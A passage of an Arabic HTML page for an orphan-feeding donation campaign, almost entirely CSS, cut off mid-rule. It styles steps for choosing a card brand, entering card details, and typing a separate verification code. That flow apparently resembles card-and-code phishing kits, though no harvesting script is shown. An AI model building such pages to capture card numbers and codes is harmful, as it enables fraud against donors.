<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تبرع الآن | حملة إطعام طفل يتيم</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #1a73e8; /* أزرق جوجل */
            --secondary-color: #34a853; /* أخضر جوجل */
            --accent-color: #fbbc05; /* أصفر جوجل */
            --dark-color: #202124; /* أسود داكن */
            --light-color: #f8f9fa; /* خلفية فاتحة */
            --text-color: #202124;
            --text-light: #5f6368;
            --error-color: #ea4335; /* أحمر جوجل */
            --success-color: #34a853;
            --warning-color: #fbbc05;
            --info-color: #1a73e8;
            --border-radius: 12px;
            --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            --gradient: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            
            /* ألوان البطاقات */
            --visa-color: #1a1f71;
            --visa-gradient: linear-gradient(135deg, #1a1f71, #4364f7);
            --mastercard-color: #eb001b;
            --mastercard-gradient: linear-gradient(135deg, #eb001b, #f7981d);
            --amex-color: #0070c0;
            --amex-gradient: linear-gradient(135deg, #0070c0, #00b4f0);
            --discover-color: #ff6000;
            --discover-gradient: linear-gradient(135deg, #ff6000, #ff9e00);
            --applepay-color: #000;
            --applepay-gradient: linear-gradient(135deg, #000, #4a4a4a);
            --unknown-card-color: #2c3e50;
            --unknown-card-gradient: linear-gradient(135deg, #2c3e50, #4ca1af);
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            direction: rtl;
            text-align: right;
            font-family: 'Tajawal', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: #f5f8fa;
            color: var(--text-color);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
            background-image: url('https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            background-blend-mode: overlay;
            background-color: rgba(245, 248, 250, 0.92);
        }
        
        .container {
            width: 100%;
            max-width: 100%;
            background: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            overflow: hidden;
            transition: var(--transition);
            margin: 10px 0;
            position: relative;
        }
        
        @media (min-width: 768px) {
            .container {
                max-width: 520px;
                margin: 20px 0;
            }
        }
        
        .container:hover {
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            transform: translateY(-3px);
        }
        
        .header {
            background: var(--gradient);
            color: white;
            padding: 20px 15px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .header::after {
            content: '';
            position: absolute;
            bottom: -50px;
            left: -50px;
            width: 120px;
            height: 120px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: -30px;
            right: -30px;
            width: 100px;
            height: 100px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }
        
        .header h1 {
            position: relative;
            z-index: 2;
            font-size: 22px;
            margin-bottom: 6px;
            font-weight: 700;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .header p {
            position: relative;
            z-index: 2;
            opacity: 0.9;
            font-size: 14px;
            font-weight: 500;
        }
        
        @media (min-width: 768px) {
            .header {
                padding: 28px 20px;
            }
            
            .header h1 {
                font-size: 26px;
                margin-bottom: 8px;
            }
            
            .header p {
                font-size: 16px;
            }
        }
        
        .content {
            padding: 20px;
            position: relative;
        }
        
        @media (min-width: 768px) {
            .content {
                padding: 25px;
            }
        }
        
        /* صفحة البداية */
        .welcome-page {
            text-align: center;
        }
        
        .campaign-slider {
            position: relative;
            height: 180px;
            overflow: hidden;
            border-radius: var(--border-radius);
            margin-bottom: 20px;
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
            transition: var(--transition);
        }
        
        @media (min-width: 768px) {
            .campaign-slider {
                height: 220px;
                margin-bottom: 25px;
                box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
            }
        }
        
        .campaign-slider:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.15);
        }
        
        .slide {
            position: absolute;
            width: 100%;
            height: 100%;
            opacity: 0;
            transition: opacity 1s ease-in-out;
            background-size: cover;
            background-position: center;
        }
        
        .slide.active {
            opacity: 1;
        }
        
        .slide-1 {
            background-image: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1532629345422-7515f3d16bb6?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
        }
        
        .slide-2 {
            background-image: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1575425186775-b8de9a427e67?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
        }
        
        .slide-3 {
            background-image: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
        }
        
        .slide-content {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 15px;
            color: white;
            background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
            text-align: center;
        }
        
        .slide-content p {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 5px;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        
        @media (min-width: 768px) {
            .slide-content {
                padding: 20px;
            }
            
            .slide-content p {
                font-size: 18px;
            }
        }
        
        .campaign-title {
            font-size: 24px;
            font-weight: 800;
            color: var(--primary-color);
            margin-bottom: 12px;
            position: relative;
            display: inline-block;
            text-shadow: 0 2px 3px rgba(0, 0, 0, 0.1);
        }
        
        .campaign-title::after {
            content: '';
            position: absolute;
            bottom: -6px;
            right: 0;
            width: 50px;
            height: 3px;
            background: var(--accent-color);
            border-radius: 2px;
        }
        
        @media (min-width: 768px) {
            .campaign-title {
                font-size: 28px;
                margin-bottom: 15px;
            }
            
            .campaign-title::after {
                bottom: -8px;
                width: 60px;
                height: 4px;
            }
        }
        
        .campaign-description {
            color: var(--text-light);
            margin-bottom: 15px;
            line-height: 1.7;
            font-size: 15px;
            font-weight: 500;
        }
        
        @media (min-width: 768px) {
            .campaign-description {
                margin-bottom: 20px;
                line-height: 1.8;
                font-size: 16px;
            }
        }
        
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 25px 0;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        @media (min-width: 768px) {
            .stats {
                margin: 30px 0;
                gap: 15px;
            }
        }
        
        .stat-item {
            text-align: center;
            flex: 1;
            min-width: 90px;
            background: var(--light-color);
            padding: 15px 8px;
            border-radius: var(--border-radius);
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
            transition: var(--transition);
            border: 1px solid rgba(0, 0, 0, 0.05);
        }
        
        @media (min-width: 768px) {
            .stat-item {
                min-width: 100px;
                padding: 20px 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
            }
        }
        
        .stat-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
            background: white;
        }
        
        .stat-number {
            font-size: 24px;
            font-weight: 800;
            color: var(--primary-color);
            position: relative;
            display: inline-block;
            margin-bottom: 5px;
        }
        
        .stat-number::after {
            content: '';
            position: absolute;
            bottom: -6px;
            right: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
            border-radius: 2px;
        }
        
        @media (min-width: 768px) {
            .stat-number {
                font-size: 28px;
            }
            
            .stat-number::after {
                bottom: -8px;
                height: 3px;
            }
        }
        
        .stat-label {
            font-size: 14px;
            color: var(--text-light);
            margin-top: 8px;
            font-weight: 600;
        }
        
        @media (min-width: 768px) {
            .stat-label {
                font-size: 15px;
                margin-top: 10px;
            }
        }
        
        .impact-statement {
            background: var(--light-color);
            padding: 15px;
            border-radius: var(--border-radius);
            margin: 20px 0;
            border-right: 3px solid var(--accent-color);
            text-align: center;
            font-style: italic;
            color: var(--primary-color);
            position: relative;
            overflow: hidden;
            font-weight: 700;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
            font-size: 16px;
            line-height: 1.6;
        }
        
        @media (min-width: 768px) {
            .impact-statement {
                padding: 20px;
                margin: 25px 0;
                border-right: 4px solid var(--accent-color);
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
                font-size: 18px;
                line-height: 1.7;
            }
        }
        
        .impact-statement::before {
            content: '\201C';
            position: absolute;
            top: 5px;
            right: 10px;
            font-size: 60px;
            color: rgba(44, 120, 108, 0.1);
            font-family: serif;
            line-height: 1;
            font-weight: bold;
        }
        
        .impact-statement::after {
            content: '\201D';
            position: absolute;
            bottom: -20px;
            left: 10px;
            font-size: 60px;
            color: rgba(44, 120, 108, 0.1);
            font-family: serif;
            line-height: 1;
            font-weight: bold;
        }
        
        @media (min-width: 768px) {
            .impact-statement::before {
                top: 10px;
                right: 15px;
                font-size: 80px;
            }
            
            .impact-statement::after {
                bottom: -25px;
                left: 15px;
                font-size: 80px;
            }
        }
        
        .testimonials {
            background: #f9f9f9;
            padding: 15px;
            border-radius: var(--border-radius);
            margin: 20px 0;
            border-right: 3px solid var(--accent-color);
            position: relative;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
            transition: var(--transition);
        }
        
        @media (min-width: 768px) {
            .testimonials {
                padding: 20px;
                margin: 25px 0;
                border-right: 4px solid var(--accent-color);
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
            }
        }
        
        .testimonials:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
        }
        
        .testimonials::before {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100" fill="none" stroke="%232c786c" stroke-width="0.5" opacity="0.1"><path d="M0,0 L100,100 M100,0 L0,100"></path></svg>');
            opacity: 0.1;
            pointer-events: none;
        }
        
        .testimonial {
            margin-bottom: 15px;
            font-style: italic;
            color: var(--text-light);
            position: relative;
            padding-right: 15px;
            line-height: 1.7;
            font-size: 15px;
        }
        
        @media (min-width: 768px) {
            .testimonial {
                margin-bottom: 20px;
                padding-right: 20px;
                line-height: 1.8;
                font-size: 16px;
            }
        }
        
        .testimonial::before {
            content: '"';
            position: absolute;
            right: 0;
            top: -8px;
            font-size: 35px;
            color: var(--accent-color);
            font-family: serif;
            line-height: 1;
            font-weight: bold;
        }
        
        @media (min-width: 768px) {
            .testimonial::before {
                top: -10px;
                font-size: 40px;
            }
        }
        
        .testimonial-author {
            font-weight: 800;
            color: var(--primary-color);
            display: flex;
            align-items: center;
            margin-top: 12px;
            font-size: 15px;
        }
        
        @media (min-width: 768px) {
            .testimonial-author {
                margin-top: 15px;
                font-size: 16px;
            }
        }
        
        .testimonial-author::before {
            content: '';
            display: inline-block;
            width: 15px;
            height: 2px;
            background: var(--accent-color);
            margin-left: 8px;
            border-radius: 2px;
        }
        
        @media (min-width: 768px) {
            .testimonial-author::before {
                width: 20px;
                height: 3px;
                margin-left: 10px;
            }
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: var(--gradient);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
            box-shadow: 0 5px 10px rgba(44, 120, 108, 0.2);
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        @media (min-width: 768px) {
            .btn {
                padding: 18px;
                font-size: 18px;
                margin-top: 25px;
                box-shadow: 0 6px 12px rgba(44, 120, 108, 0.2);
            }
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 15px rgba(44, 120, 108, 0.3);
            background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
        }
        
        .btn:active {
            transform: translateY(1px);
            box-shadow: 0 3px 6px rgba(44, 120, 108, 0.3);
        }
        
        .btn::after {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 40px;
            height: 200px;
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(30deg);
            transition: all 0.8s cubic-bezier(0.25, 0.8, 0.25, 1);
            z-index: -1;
        }
        
        .btn:hover::after {
            right: 120%;
        }
        
        .btn i {
            margin-right: 8px;
            transition: var(--transition);
            font-size: 18px;
        }
        
        @media (min-width: 768px) {
            .btn i {
                margin-right: 10px;
                font-size: 20px;
            }
        }
        
        .btn:hover i {
            transform: scale(1.2);
            color: var(--light-color);
        }
        
        /* شعار المنظمة */
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        
        @media (min-width: 768px) {
            .logo {
                margin-bottom: 25px;
            }
        }
        
        .logo-icon {
            width: 50px;
            height: 50px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary-color);
            font-size: 24px;
            margin-left: 12px;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
        }
        
        @media (min-width: 768px) {
            .logo-icon {
                width: 60px;
                height: 60px;
                font-size: 28px;
                margin-left: 15px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            }
        }
        
        .logo-text {
            font-size: 20px;
            font-weight: 800;
            color: white;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        @media (min-width: 768px) {
            .logo-text {
                font-size: 24px;
            }
        }
        
        /* معلومات إضافية */
        .info-box {
            background: var(--light-color);
            padding: 15px;
            border-radius: var(--border-radius);
            margin: 20px 0;
            border-right: 3px solid var(--accent-color);
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
            transition: var(--transition);
        }
        
        @media (min-width: 768px) {
            .info-box {
                padding: 20px;
                margin: 25px 0;
                border-right: 4px solid var(--accent-color);
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
            }
        }
        
        .info-box:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
        }
        
        .info-box-title {
            font-weight: 800;
            color: var(--primary-color);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            font-size: 16px;
        }
        
        @media (min-width: 768px) {
            .info-box-title {
                margin-bottom: 15px;
                font-size: 18px;
            }
        }
        
        .info-box-title i {
            margin-left: 8px;
            font-size: 18px;
        }
        
        @media (min-width: 768px) {
            .info-box-title i {
                margin-left: 10px;
                font-size: 20px;
            }
        }
        
        .info-box-content {
            color: var(--text-light);
            line-height: 1.7;
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            .info-box-content {
                line-height: 1.8;
                font-size: 15px;
            }
        }
        
        /* تذييل الصفحة */
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            color: var(--text-light);
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            .footer {
                margin-top: 35px;
                padding-top: 25px;
                font-size: 15px;
            }
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 12px;
        }
        
        @media (min-width: 768px) {
            .footer-links {
                gap: 20px;
                margin-top: 15px;
            }
        }
        
        .footer-link {
            color: var(--primary-color);
            text-decoration: none;
            transition: var(--transition);
            font-weight: 600;
            font-size: 14px;
        }
        
        @media (min-width: 768px) {
            .footer-link {
                font-size: 15px;
            }
        }
        
        .footer-link:hover {
            text-decoration: underline;
            color: var(--secondary-color);
        }
        
        /* تأثيرات التحميل */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            display: none;
            flex-direction: column;
            backdrop-filter: blur(5px);
        }
        
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--primary-color);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 15px;
        }
        
        @media (min-width: 768px) {
            .loader {
                border-width: 6px;
                width: 60px;
                height: 60px;
                margin-bottom: 20px;
            }
        }
        
        .loading-text {
            color: var(--primary-color);
            font-weight: 700;
            margin-top: 15px;
            font-size: 16px;
        }
        
        @media (min-width: 768px) {
            .loading-text {
                margin-top: 20px;
                font-size: 18px;
            }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* تأثيرات الانتقال بين الصفحات */
        .page-transition {
            animation: fadeIn 0.6s cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* تأثيرات الظل للبطاقات */
        .card-shadow {
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            transition: var(--transition);
        }
        
        .card-shadow:hover {
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
        }
        
        /* تأثيرات اللمس للأزرار */
        .btn-touch {
            transition: transform 0.1s, box-shadow 0.1s;
        }
        
        .btn-touch:active {
            transform: scale(0.98);
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1) !important;
        }
        
        /* تأثيرات التوهج */
        .glow-effect {
            position: relative;
            overflow: hidden;
        }
        
        .glow-effect::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 70%);
            opacity: 0;
            transition: opacity 0.5s;
        }
        
        .glow-effect:hover::after {
            opacity: 1;
        }
        
        /* تأثيرات النص */
        .text-shadow {
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        /* صفحة اختيار طريقة الدفع */
        .payment-method-page {
            display: none;
        }
        
        .payment-methods {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin: 15px 0;
        }
        
        @media (min-width: 768px) {
            .payment-methods {
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
                margin: 20px 0;
            }
        }
        
        .payment-method {
            background: white;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        @media (min-width: 768px) {
            .payment-method {
                padding: 20px 15px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
            }
        }
        
        .payment-method::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2), transparent);
            opacity: 0;
            transition: var(--transition);
        }
        
        .payment-method:hover::before {
            opacity: 1;
        }
        
        /* تصميم بطاقة فيزا */
        .payment-method[data-method="visa"] {
            background: white;
            color: var(--visa-color);
            border-color: #e0e0e0;
        }
        
        /* تصميم بطاقة ماستركارد */
        .payment-method[data-method="mastercard"] {
            background: white;
            color: var(--mastercard-color);
            border-color: #e0e0e0;
        }
        
        /* تصميم أبل باي */
        .payment-method[data-method="applepay"] {
            background: white;
            color: var(--applepay-color);
            border-color: #e0e0e0;
        }
        
        .payment-method:hover, .payment-method.selected {
            transform: translateY(-5px);
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.15);
        }
        
        .payment-method.selected {
            border: 2px solid var(--accent-color);
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
        }
        
        .payment-icon {
            width: 50px;
            height: 35px;
            object-fit: contain;
            margin-bottom: 10px;
            transition: var(--transition);
        }
        
        @media (min-width: 768px) {
            .payment-icon {
                width: 60px;
                height: 40px;
                margin-bottom: 12px;
            }
        }
        
        .payment-method:hover .payment-icon {
            transform: scale(1.1);
        }
        
        .payment-method .badge {
            position: absolute;
            top: 8px;
            left: 8px;
            background: var(--accent-color);
            color: white;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 500;
        }
        
        @media (min-width: 768px) {
            .payment-method .badge {
                top: 10px;
                left: 10px;
                padding: 2px 8px;
                font-size: 11px;
            }
        }
        
        /* صفحة التبرع */
        .donation-amount-page {
            display: none;
        }
        
        .amount-options {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 15px 0;
        }
        
        @media (min-width: 768px) {
            .amount-options {
                grid-template-columns: repeat(3, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
        }
        
        .amount-option {
            background: white;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            padding: 15px 8px;
            text-align: center;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
            font-weight: 600;
            font-size: 15px;
        }
        
        @media (min-width: 768px) {
            .amount-option {
                padding: 18px 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
                font-size: 16px;
            }
        }
        
        .amount-option::before {
            content: '';
            position: absolute;
            bottom: 0;
            right: 0;
            width: 0;
            height: 3px;
            background: var(--accent-color);
            transition: var(--transition);
        }
        
        .amount-option:hover::before {
            width: 100%;
        }
        
        .amount-option:hover, .amount-option.selected {
            border-color: var(--accent-color);
            background: var(--light-color);
        }
        
        .amount-option.selected {
            border: 2px solid var(--accent-color);
            background: var(--light-color);
            color: var(--primary-color);
        }
        
        .amount-option.selected::before {
            width: 100%;
        }
        
        .custom-amount {
            margin: 15px 0;
        }
        
        @media (min-width: 768px) {
            .custom-amount {
                margin: 20px 0;
            }
        }
        
        .payment-form, .verification-form, .thank-you-page {
            display: none;
        }
        
        .form-group {
            margin-bottom: 15px;
            position: relative;
        }
        
        @media (min-width: 768px) {
            .form-group {
                margin-bottom: 20px;
            }
        }
        
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: var(--text-color);
            position: relative;
            padding-right: 5px;
            font-size: 15px;
        }
        
        @media (min-width: 768px) {
            .form-group label {
                margin-bottom: 8px;
                font-size: 16px;
            }
        }
        
        .form-group label::after {
            content: '*';
            color: var(--error-color);
            margin-right: 5px;
            display: none;
        }
        
        .form-group.required label::after {
            display: inline;
        }
        
        .form-group input, .form-group textarea, .form-group select {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 15px;
            transition: var(--transition);
            background: #fff;
        }
        
        @media (min-width: 768px) {
            .form-group input, .form-group textarea, .form-group select {
                padding: 14px 15px;
                font-size: 16px;
            }
        }
        
        .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 0 3px rgba(44, 120, 108, 0.1);
            outline: none;
        }
        
        .form-group input.invalid, .form-group textarea.invalid {
            border-color: var(--error-color);
        }
        
        /* حقول الأرقام فقط */
        .number-input {
            direction: ltr;
            text-align: left;
        }
        
        .back-btn {
            background: none;
            border: none;
            color: var(--primary-color);
            font-size: 15px;
            cursor: pointer;
            margin-bottom: 15px;
            padding: 6px 10px;
            border-radius: 5px;
            transition: var(--transition);
            display: inline-flex;
            align-items: center;
            font-weight: 600;
        }
        
        @media (min-width: 768px) {
            .back-btn {
                font-size: 16px;
                margin-bottom: 20px;
                padding: 8px 12px;
            }
        }
        
        .back-btn:hover {
            background: #f0f0f0;
        }
        
        .back-btn i {
            margin-left: 5px;
            transition: var(--transition);
        }
        
        .back-btn:hover i {
            transform: translateX(3px);
        }
        
        .card-preview {
            background: var(--unknown-card-gradient);
            color: white;
            padding: 15px;
            border-radius: var(--border-radius);
            margin-bottom: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            height: 180px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
            overflow: hidden;
            transition: var(--transition);
        }
        
        @media (min-width: 768px) {
            .card-preview {
                padding: 20px;
                height: 200px;
                margin-bottom: 20px;
                box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
            }
        }
        
        /* ألوان بطاقات الدفع المعدلة بشكل أكثر احترافية */
        .card-preview.visa {
            background: var(--visa-gradient);
        }
        
        .card-preview.mastercard {
            background: var(--mastercard-gradient);
        }
        
        .card-preview.amex {
            background: var(--amex-gradient);
        }
        
        .card-preview.discover {
            background: var(--discover-gradient);
        }
        
        .card-preview.applepay {
            background: var(--applepay-gradient);
        }
        
        .card-preview::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 100px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            transform: rotate(30deg);
            transition: all 0.5s;
        }
        
        .card-preview:hover::after {
            left: 120%;
        }
        
        .card-number {
            font-size: 18px;
            letter-spacing: 1px;
            margin: 15px 0;
            font-family: monospace;
            direction: ltr;
            text-align: left;
            position: relative;
            z-index: 2;
        }
        
        @media (min-width: 768px) {
            .card-number {
                font-size: 22px;
                letter-spacing: 2px;
                margin: 20px 0;
            }
        }
        
        .card-details {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            position: relative;
            z-index: 2;
        }
        
        @media (min-width: 768px) {
            .card-details {
                font-size: 14px;
            }
        }
        
        .phone-info {
            display: flex;
            align-items: center;
            margin-top: 8px;
            color: white;
        }
        
        @media (min-width: 768px) {
            .phone-info {
                margin-top: 10px;
            }
        }
        
        .phone-info i {
            margin-left: 6px;
        }
        
        @media (min-width: 768px) {
            .phone-info i {
                margin-left: 8px;
            }
        }
        
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: var(--gradient);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
            transition: var(--transition);
            box-shadow: 0 5px 10px rgba(44, 120, 108, 0.2);
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        @media (min-width: 768px) {
            .submit-btn {
                padding: 16px;
                font-size: 17px;
                margin-top: 20px;
                box-shadow: 0 6px 12px rgba(44, 120, 108, 0.2);
            }
        }
        
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 15px rgba(44, 120, 108, 0.3);
            background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
        }
        
        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .submit-btn:disabled:hover {
            background: #ccc;
        }
        
        .submit-btn::after {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 40px;
            height: 100px;
            background: rgba(255, 255, 255, 0.2);
            transform: rotate(30deg);
            transition: all 0.5s;
        }
        
        .submit-btn:hover::after {
            right: 120%;
        }
        
        .submit-btn i {
            margin-right: 8px;
            transition: var(--transition);
        }
        
        .submit-btn:hover i {
            transform: scale(1.2);
        }
        
        /* رسائل الخطأ والتحذير */
        .error-message {
            color: var(--error-color);
            font-size: 13px;
            margin-top: 5px;
            display: none;
            position: absolute;
            bottom: -18px;
            right: 0;
            background: rgba(255, 107, 107, 0.1);
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: 500;
        }
        
        .warning-message {
            color: var(--warning-color);
            font-size: 13px;
            margin-top: 5px;
            display: none;
            position: absolute;
            bottom: -18px;
            right: 0;
            background: rgba(252, 196, 25, 0.1);
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: 500;
        }
        
        .info-message {
            color: var(--info-color);
            font-size: 13px;
            margin-top: 5px;
            display: none;
            position: absolute;
            bottom: -18px;
            right: 0;
            background: rgba(51, 154, 240, 0.1);
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: 500;
        }
        
        @media (min-width: 768px) {
            .error-message,
            .warning-message,
            .info-message {
                font-size: 14px;
                bottom: -20px;
            }
        }
        
        /* أيقونة تحذير حمراء */
        .error-icon {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--error-color);
            font-size: 16px;
            display: none;
        }
        
        /* صفحة التحقق */
        .verification-header {
            text-align: center;
            margin-bottom: 25px;
        }
        
        @media (min-width: 768px) {
            .verification-header {
                margin-bottom: 30px;
            }
        }
        
        .verification-icon {
            font-size: 45px;
            color: var(--primary-color);
            margin-bottom: 12px;
            animation: pulse 2s infinite;
        }
        
        @media (min-width: 768px) {
            .verification-icon {
                font-size: 50px;
                margin-bottom: 15px;
            }
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .verification-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
            color: var(--primary-color);
        }
        
        @media (min-width: 768px) {
            .verification-title {
                font-size: 22px;
                margin-bottom: 10px;
            }
        }
        
        .verification-desc {
            color: var(--text-light);
            margin-bottom: 15px;
            line-height: 1.6;
            font-size: 15px;
        }
        
        @media (min-width: 768px) {
            .verification-desc {
                margin-bottom: 20px;
                font-size: 16px;
            }
        }
        
        .code-inputs {
            display: flex;
            justify-content: center;
